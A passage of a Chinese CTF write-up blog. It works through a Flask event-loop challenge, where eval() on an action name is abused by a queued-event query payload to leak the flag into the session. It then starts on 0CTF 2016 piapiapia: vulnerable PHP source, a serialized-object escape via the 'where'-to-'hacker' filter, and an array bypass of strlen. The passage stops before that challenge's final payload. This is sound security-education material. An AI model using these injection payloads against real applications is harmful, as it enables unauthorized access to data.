&apos;;&apos;)</span><br><span class="line">            args = get_mid_str(event, action+&apos;;&apos;).split(&apos;#&apos;)</span><br><span class="line">            try:</span><br><span class="line">                event_handler = eval(</span><br><span class="line">                    action + (&apos;_handler&apos; if is_action else &apos;_function&apos;))</span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            except RollBackException:</span><br><span class="line">                if resp is None:</span><br><span class="line">                    resp = &apos;&apos;</span><br><span class="line">                resp += &apos;ERROR! All transactions have been cancelled. &lt;br /&gt;&apos;</span><br><span class="line">                resp += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">                session[&apos;num_items&apos;] = request.prev_session[&apos;num_items&apos;]</span><br><span class="line">                session[&apos;points&apos;] = request.prev_session[&apos;points&apos;]</span><br><span class="line">                break</span><br><span class="line">            except Exception, e:</span><br><span class="line">                if resp is None:</span><br><span class="line">                    resp = &apos;&apos;</span><br><span class="line">                # resp += str(e) # only for debugging</span><br><span class="line">                continue</span><br><span class="line">            if ret_val is not None:</span><br><span class="line">                if resp is None:</span><br><span class="line">                    resp = ret_val</span><br><span class="line">                else:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    if resp is None or resp == &apos;&apos;:</span><br><span class="line">        resp = (&apos;404 NOT FOUND&apos;, 404)</span><br><span class="line">    session.modified = True</span><br><span class="line">    return resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(url_prefix+&apos;/&apos;)</span><br><span class="line">def entry_point():</span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    request.event_queue = []</span><br><span class="line">    if querystring == &apos;&apos; or (not querystring.startswith(&apos;action:&apos;)) or len(querystring) &gt; 100:</span><br><span class="line">        querystring = &apos;action:index;False#False&apos;</span><br><span class="line">    if &apos;num_items&apos; not in session:</span><br><span class="line">        session[&apos;num_items&apos;] = 0</span><br><span class="line">        session[&apos;points&apos;] = 3</span><br><span class="line">        session[&apos;log&apos;] = []</span><br><span class="line">    request.prev_session = dict(session)</span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    return execute_event_loop()</span><br><span class="line"></span><br><span class="line"># handlers/functions below --------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def view_handler(args):</span><br><span class="line">    page = args[0]</span><br><span class="line">    html = &apos;&apos;</span><br><span class="line">    html += &apos;[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;&apos;.format(</span><br><span class="line">        session[&apos;num_items&apos;], session[&apos;points&apos;])</span><br><span class="line">    if page == &apos;index&apos;:</span><br><span class="line">        html += &apos;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">        html += &apos;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">        html += &apos;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">    elif page == &apos;shop&apos;:</span><br><span class="line">        html += &apos;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">    elif page == &apos;reset&apos;:</span><br><span class="line">        del session[&apos;num_items&apos;]</span><br><span class="line">        html += &apos;Session reset.&lt;br /&gt;&apos;</span><br><span class="line">    html += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def index_handler(args):</span><br><span class="line">    bool_show_source = str(args[0])</span><br><span class="line">    bool_download_source = str(args[1])</span><br><span class="line">    if bool_show_source == &apos;True&apos;:</span><br><span class="line"></span><br><span class="line">        source = open(&apos;eventLoop.py&apos;, &apos;r&apos;)</span><br><span class="line">        html = &apos;&apos;</span><br><span class="line">        if bool_download_source != &apos;True&apos;:</span><br><span class="line">            html += &apos;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">            html += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line"></span><br><span class="line">        for line in source:</span><br><span class="line">            if bool_download_source != &apos;True&apos;:</span><br><span class="line">                html += line.replace(&apos;&amp;&apos;, &apos;&amp;amp;&apos;).replace(&apos;\t&apos;, &apos;&amp;nbsp;&apos;*4).replace(</span><br><span class="line">                    &apos; &apos;, &apos;&amp;nbsp;&apos;).replace(&apos;&lt;&apos;, &apos;&amp;lt;&apos;).replace(&apos;&gt;&apos;, &apos;&amp;gt;&apos;).replace(&apos;\n&apos;, &apos;&lt;br /&gt;&apos;)</span><br><span class="line">            else:</span><br><span class="line">                html += line</span><br><span class="line">        source.close()</span><br><span class="line"></span><br><span class="line">        if bool_download_source == &apos;True&apos;:</span><br><span class="line">            headers = &#123;&#125;</span><br><span class="line">            headers[&apos;Content-Type&apos;] = &apos;text/plain&apos;</span><br><span class="line">            headers[&apos;Content-Disposition&apos;] = &apos;attachment; filename=serve.py&apos;</span><br><span class="line">            return Response(html, headers=headers)</span><br><span class="line">        else:</span><br><span class="line">            return html</span><br><span class="line">    else:</span><br><span class="line">        trigger_event(&apos;action:view;index&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def buy_handler(args):</span><br><span class="line">    num_items = int(args[0])</span><br><span class="line">    if num_items &lt;= 0:</span><br><span class="line">        return &apos;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&apos;.format(args[0])</span><br><span class="line">    session[&apos;num_items&apos;] += num_items</span><br><span class="line">    trigger_event([&apos;func:consume_point;&#123;&#125;&apos;.format(</span><br><span class="line">        num_items), &apos;action:view;index&apos;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def consume_point_function(args):</span><br><span class="line">    point_to_consume = int(args[0])</span><br><span class="line">    if session[&apos;points&apos;] &lt; point_to_consume:</span><br><span class="line">        raise RollBackException()</span><br><span class="line">    session[&apos;points&apos;] -= point_to_consume</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show_flag_function(args):</span><br><span class="line">    flag = args[0]</span><br><span class="line">    # return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span><br><span class="line">    return &apos;You naughty boy! ;) &lt;br /&gt;&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_flag_handler(args):</span><br><span class="line">    if session[&apos;num_items&apos;] &gt;= 5:</span><br><span class="line">        # show_flag_function has been disabled, no worries</span><br><span class="line">        trigger_event(&apos;func:show_flag;&apos; + FLAG())</span><br><span class="line">    trigger_event(&apos;action:view;index&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.run(debug=False, host=&apos;0.0.0.0&apos;)</span><br></pre></td></tr></table></figure>
<p>大概看看函数功能</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">FLAG()函数返回flag</span><br><span class="line"></span><br><span class="line">trigger_event函数将接收到的event存入session[&apos;log&apos;](重要,后面读取到的flag会存到里面)，随后将event存入时间队列</span><br><span class="line"></span><br><span class="line">get_mid_str函数用来拆分字符串</span><br><span class="line"></span><br><span class="line">execute_event_loop函数执行一个队列循环，将逐个处理事件。</span><br><span class="line">给出了event的格式，形如action:xxx;args</span><br><span class="line">然后对其中的字符进行检查，如果都没问题，</span><br><span class="line">用get_mid_str函数取出action和参数，其中action取event中第一个:和第一个;中间的内容。</span><br><span class="line">而args取action+;之后的内容。</span><br><span class="line">比如有一个event=action:test;111</span><br><span class="line">那么action就是test,参数就是111,多个参数用#分隔开</span><br><span class="line">接下来根据is_action内容用eval对action和_handler或_function进行拼接(重要)</span><br><span class="line"></span><br><span class="line">entry_point函数，主路由，对查询字符串进行处理然后设置trriger_event,随后执行execute_event_loop函数并返回结果</span><br><span class="line"></span><br><span class="line">buy_handler函数，买钻石，这里有一个重要的点是会先给钻石加到session里再检查是否有足够的点数。</span><br><span class="line"></span><br><span class="line">consume_point_function，检查是否有足够的点数买钻石，如果没有就回滚状态到上一个访问index时保存的状态。</span><br><span class="line"></span><br><span class="line">get_flag_handler，如果钻石大于等于5，就trigger_event(&apos;func:show_flag;&apos; + FLAG()),也就是说，</span><br><span class="line">会把真正的flag存到日志里面去，而flask的session是可以解密的，到时候解密出来就行了。</span><br></pre></td></tr></table></figure>
<p>重点注意其中的买钻石函数，明显有漏洞存在</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def buy_handler(args):</span><br><span class="line">    num_items = int(args[0])</span><br><span class="line">    if num_items &lt;= 0:</span><br><span class="line">        return &apos;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&apos;.format(args[0])</span><br><span class="line">    session[&apos;num_items&apos;] += num_items # 重点，先加上了钻石</span><br><span class="line">    trigger_event([&apos;func:consume_point;&#123;&#125;&apos;.format(</span><br><span class="line">        num_items), &apos;action:view;index&apos;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def consume_point_function(args):</span><br><span class="line">    point_to_consume = int(args[0])</span><br><span class="line">    if session[&apos;points&apos;] &lt; point_to_consume:</span><br><span class="line">        raise RollBackException()</span><br><span class="line">    session[&apos;points&apos;] -= point_to_consume</span><br></pre></td></tr></table></figure>
<p>这里在买的时候没验证点数，先给了钻石，随后才验证点数够不够，不够就回滚到之前的状态。<br>状态在访问index的时候保存起来了。<br>那这里思路就是先买了钻石然后紧接着执行get_flag_handler。<br>做题的时候想到这里就做不下去了，打不出payload，只好看wp。</p>
<hr>
<p><a href="https://xz.aliyun.com/t/4843" target="_blank" rel="noopener">传送门</a><br>这里还是自己太菜了，明明有个eval函数却放过了，拿出师傅的payload再分析一波</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action:trigger_event%23;action:buy;5%23action:get_flag;</span><br></pre></td></tr></table></figure>
<p>这个payload也是根据刚才的思路构建的，先执行买操作，紧接着执行get_flag_handler，后面就不用管了，flag已经在log里面了。<br>仔细分析一下，当传入这个payload的时候会执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">trriger(&apos;action:trigger_event#;action:buy;5#action:get_flag;&apos;)</span><br><span class="line">接下来到execute_event_loop执行</span><br><span class="line">分析可知，action内容为trigger_event#</span><br><span class="line">args为[&apos;action:buy;5&apos;,&apos;action:get_flag;&apos;]</span><br><span class="line">接下来执行到eval的时候</span><br><span class="line">event_handler=eval(action + (&apos;_handler&apos; if is_action else &apos;_function&apos;))</span><br><span class="line">会变成eval(&apos;trigger_event#handler&apos;)</span><br><span class="line">也就是trigger_event#handler(注意，这里eval是代码执行，会把&apos;&apos;包裹的内容提取出来当成代码执行)</span><br><span class="line">而#后面的部分会被注释掉，所以最终的event_handler就是trriger_event函数</span><br><span class="line">所以会执行</span><br><span class="line">trriger_event([&apos;action:buy;5&apos;,&apos;action:get_flag;&apos;])</span><br><span class="line">而这个操作会在事件队列里面增加两个事件，先买到5个钻石，随后执行get_flag_handler，从而将flag存到session里。</span><br><span class="line">解密session内容即可获取flag</span><br></pre></td></tr></table></figure>
<p>当然，由于会执行完整个事件队列，所以最后还是会报错，但是已经不重要了，flag已经到了session里面。<br><img src="https://i.loli.net/2020/04/09/9qYCM4JLuDmrlIi.png" alt="Snipaste_2020-04-09_15-33-51.png"></p>
<h3 id="总结-24"><a href="#总结-24" class="headerlink" title="总结"></a>总结</h3><p>这道题主要是代码审计，看虽然看得懂，但是没有写出payload还是有点可惜，肯定是代码写太少了。<br>也感谢表哥们出的题和写的wp。</p>
<h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>知识点</p>
<ul>
<li>过滤导致的反序列化对象逃逸</li>
<li>数组绕过strlen()函数(返回null)</li>
</ul>
<hr>
<p>进去扫后台拿到源码。这里只看关键部分内容<br>class.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(&apos;config.php&apos;);</span><br><span class="line"></span><br><span class="line">class user extends mysql&#123;</span><br><span class="line">	private $table = &apos;users&apos;;</span><br><span class="line"></span><br><span class="line">	public function is_exists($username) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">		return parent::select($this-&gt;table, $where); //select * from users where username=&quot;&apos;$username&apos;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	public function register($username, $password) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$password = parent::filter($password);</span><br><span class="line"></span><br><span class="line">		$key_list = Array(&apos;username&apos;, &apos;password&apos;);</span><br><span class="line">		$value_list = Array($username, md5($password));</span><br><span class="line">		return parent::insert($this-&gt;table, $key_list, $value_list);</span><br><span class="line">	&#125;</span><br><span class="line">	public function login($username, $password) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$password = parent::filter($password);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">		$object = parent::select($this-&gt;table, $where);</span><br><span class="line">		if ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line">			return true;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			return false;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public function show_profile($username) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">		$object = parent::select($this-&gt;table, $where);</span><br><span class="line">		return $object-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">	public function update_profile($username, $new_profile) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$new_profile = parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">		return parent::update($this-&gt;table, &apos;profile&apos;, $new_profile, $where);</span><br><span class="line">	&#125;</span><br><span class="line">	public function __tostring() &#123;</span><br><span class="line">		return __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class mysql &#123;</span><br><span class="line">	private $link = null;																																																																																		</span><br><span class="line"></span><br><span class="line">	public function connect($config) &#123;</span><br><span class="line">		$this-&gt;link = mysql_connect(</span><br><span class="line">			$config[&apos;hostname&apos;],</span><br><span class="line">			$config[&apos;username&apos;], </span><br><span class="line">			$config[&apos;password&apos;]</span><br><span class="line">		);</span><br><span class="line">		mysql_select_db($config[&apos;database&apos;]);</span><br><span class="line">		mysql_query(&quot;SET sql_mode=&apos;strict_all_tables&apos;&quot;);</span><br><span class="line"></span><br><span class="line">		return $this-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function select($table, $where, $ret = &apos;*&apos;) &#123;</span><br><span class="line">		$sql = &quot;SELECT $ret FROM $table WHERE $where&quot;;</span><br><span class="line">		$result = mysql_query($sql, $this-&gt;link);</span><br><span class="line">		return mysql_fetch_object($result);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function insert($table, $key_list, $value_list) &#123;</span><br><span class="line">		$key = implode(&apos;,&apos;, $key_list);</span><br><span class="line">		$value = &apos;\&apos;&apos; . implode(&apos;\&apos;,\&apos;&apos;, $value_list) . &apos;\&apos;&apos;; //&apos;,&apos;</span><br><span class="line">		$sql = &quot;INSERT INTO $table ($key) VALUES ($value)&quot;;</span><br><span class="line">		return mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function update($table, $key, $value, $where) &#123;</span><br><span class="line">		$sql = &quot;UPDATE $table SET $key = &apos;$value&apos; WHERE $where&quot;;</span><br><span class="line">		return mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function filter($string) &#123;</span><br><span class="line">		$escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);</span><br><span class="line">		$escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;</span><br><span class="line">		$string = preg_replace($escape, &apos;_&apos;, $string);</span><br><span class="line"></span><br><span class="line">		$safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);</span><br><span class="line">		$safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;</span><br><span class="line">		return preg_replace($safe, &apos;hacker&apos;, $string);</span><br><span class="line">	&#125;</span><br><span class="line">	public function __tostring() &#123;</span><br><span class="line">		return __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = new user();</span><br><span class="line">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure>
<p>config.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$config[&apos;hostname&apos;] = &apos;127.0.0.1&apos;;</span><br><span class="line">	$config[&apos;username&apos;] = &apos;root&apos;;</span><br><span class="line">	$config[&apos;password&apos;] = &apos;&apos;;</span><br><span class="line">	$config[&apos;database&apos;] = &apos;&apos;;</span><br><span class="line">	$flag = &apos;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里应该可以看出flag在config.php里面了。<br>再看两个比较关键的代码文件<br>profile.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&apos;class.php&apos;);</span><br><span class="line">	if($_SESSION[&apos;username&apos;] == null) &#123;</span><br><span class="line">		die(&apos;Login First&apos;);	</span><br><span class="line">	&#125;</span><br><span class="line">	$username = $_SESSION[&apos;username&apos;];</span><br><span class="line">	$profile=$user-&gt;show_profile($username);</span><br><span class="line">	if($profile  == null) &#123;</span><br><span class="line">		header(&apos;Location: update.php&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[&apos;phone&apos;];</span><br><span class="line">		$email = $profile[&apos;email&apos;];</span><br><span class="line">		$nickname = $profile[&apos;nickname&apos;];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[&apos;photo&apos;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>注意到，这里有一个file_get_contents,有可能读取任意文件。<br>而且$profile是从数据库抓取的数据。<br>再看update.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&apos;class.php&apos;);</span><br><span class="line">	if($_SESSION[&apos;username&apos;] == null) &#123;</span><br><span class="line">		die(&apos;Login First&apos;);	</span><br><span class="line">	&#125;</span><br><span class="line">	if($_POST[&apos;phone&apos;] &amp;&amp; $_POST[&apos;email&apos;] &amp;&amp; $_POST[&apos;nickname&apos;] &amp;&amp; $_FILES[&apos;photo&apos;]) &#123;</span><br><span class="line"></span><br><span class="line">		$username = $_SESSION[&apos;username&apos;];</span><br><span class="line">		if(!preg_match(&apos;/^\d&#123;11&#125;$/&apos;, $_POST[&apos;phone&apos;]))</span><br><span class="line">			die(&apos;Invalid phone&apos;);</span><br><span class="line"></span><br><span class="line">		if(!preg_match(&apos;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&apos;, $_POST[&apos;email&apos;]))</span><br><span class="line">			die(&apos;Invalid email&apos;);</span><br><span class="line">		</span><br><span class="line">		if(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10)</span><br><span class="line">			die(&apos;Invalid nickname&apos;);</span><br><span class="line"></span><br><span class="line">		$file = $_FILES[&apos;photo&apos;];</span><br><span class="line">		if($file[&apos;size&apos;] &lt; 5 or $file[&apos;size&apos;] &gt; 1000000)</span><br><span class="line">			die(&apos;Photo size error&apos;);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file($file[&apos;tmp_name&apos;], &apos;upload/&apos; . md5($file[&apos;name&apos;]));</span><br><span class="line">		$profile[&apos;phone&apos;] = $_POST[&apos;phone&apos;];</span><br><span class="line">		$profile[&apos;email&apos;] = $_POST[&apos;email&apos;];</span><br><span class="line">		$profile[&apos;nickname&apos;] = $_POST[&apos;nickname&apos;];</span><br><span class="line">		$profile[&apos;photo&apos;] = &apos;upload/&apos; . md5($file[&apos;name&apos;]);</span><br><span class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		echo &apos;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里是更新我们个人资料的页面。<br>在这里获取我们上传的电话号码，电子邮件地址，昵称，还有上传的照片。<br>而这里照片已经写死了md5，不可能从中正好读取到需要的config.php。<br>思路到这里我就断了，又去看wp。</p>
<hr>
<p>还是审计代码不够仔细，这里把获取到的数据反序列化，然后调用update_profile更新数据。<br>注意到update_profile会对传入的数据进行过滤和替换，然后存入数据库。<br>而执行profile.php的时候会从数据库中读取一个profile对象，然后读取其中photo指向的文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">	public function update_profile($username, $new_profile) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$new_profile = parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">		return parent::update($this-&gt;table, &apos;profile&apos;, $new_profile, $where);</span><br><span class="line">	&#125;</span><br><span class="line">    ...</span><br><span class="line">	public function update($table, $key, $value, $where) &#123;</span><br><span class="line">		$sql = &quot;UPDATE $table SET $key = &apos;$value&apos; WHERE $where&quot;;</span><br><span class="line">		return mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function filter($string) &#123;</span><br><span class="line">		$escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);</span><br><span class="line">		$escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;</span><br><span class="line">		$string = preg_replace($escape, &apos;_&apos;, $string);</span><br><span class="line"></span><br><span class="line">		$safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);</span><br><span class="line">		$safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;</span><br><span class="line">		return preg_replace($safe, &apos;hacker&apos;, $string);</span><br><span class="line">	&#125;</span><br><span class="line">	public function __tostring() &#123;</span><br><span class="line">		return __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正是这个过滤破坏了序列化后的结构，使得我们有了可趁之机。<br>现在需要想办法构造一个对象，形如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;i:12345678901;s:5:&quot;email&quot;;s:13:&quot;test@test.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:39:&quot;irrik&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>而注意到过滤函数filter会把where替换成hacker，有字符差就有机会。<br>而注意到nickname对长度有限制，要求strlen(nickname)&lt;10.这里把nickname作数组传值即可。<br>strlen(array)为null。null&lt;10为true，成功绕过长度限制。<br>最后构造如下payload</p>
